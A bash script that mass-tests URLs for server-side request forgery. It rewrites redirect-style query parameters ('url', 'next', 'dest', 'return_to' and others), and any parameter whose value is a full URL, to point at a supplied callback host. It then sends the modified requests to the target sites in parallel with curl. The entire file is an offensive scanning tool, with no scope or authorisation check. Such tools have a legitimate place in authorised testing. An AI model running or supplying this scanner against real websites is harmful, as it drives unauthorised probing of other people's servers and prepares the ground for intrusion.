#!/bin/bash

input_file=""
callback_url=""
output_file="ssrf_test_results.txt"
concurrency=10

usage() {
  echo "Usage: $0 -f <url_list_file> -d <callback_url> [-o <output_file>] [-c <concurrency>]"
  exit 1
}

while getopts "f:d:o:c:" opt; do
  case "$opt" in
    f) input_file="$OPTARG" ;;
    d) callback_url="$OPTARG" ;;
    o) output_file="$OPTARG" ;;
    c) concurrency="$OPTARG" ;;
    *) usage ;;
  esac
done

if [[ -z "$input_file" || -z "$callback_url" ]]; then
  usage
fi

params=("url" "redirect" "next" "data" "dest" "reference" "site" "continue" "target" "uri" "return_to")
encoded_callback=$(printf "%s" "$callback_url" | jq -s -R -r @uri)

> "$output_file"
queue_file=$(mktemp)

# Build SSRF test queue
while IFS= read -r url || [[ -n "$url" ]]; do
  base_url="${url%%\?*}"
  query_string="${url#*\?}"
  modified=0

  # Collect modified parameters
  IFS='&' read -ra pairs <<< "$query_string"
  for i in "${!pairs[@]}"; do
    key="${pairs[$i]%%=*}"
    value="${pairs[$i]#*=}"

    # Check for exact param match
    if printf '%s\n' "${params[@]}" | grep -q "^$key$"; then
      pairs[$i]="${key}=${encoded_callback}"
      modified=1
    elif [[ "$value" =~ ^https?:// ]]; then
      # Check if value starts with http/https
      pairs[$i]="${key}=${encoded_callback}"
      modified=1
    fi
  done

  if [[ "$modified" -eq 1 ]]; then
    new_query=$(IFS='&'; echo "${pairs[*]}")
    new_url="${base_url}?${new_query}"
    echo "$new_url" >> "$queue_file"
  else
    echo "[-] No SSRF-prone param/value in: $url"
  fi

done < "$input_file"

# Fire requests in parallel
cat "$queue_file" | xargs -P "$concurrency" -n 1 -I{} bash -c 'echo "[+] Firing: {}"; curl -s -o /dev/null "{}"; echo "{}" >> "'"$output_file"'"'

rm -f "$queue_file"
echo "✅ Done. Results saved to: $output_file"
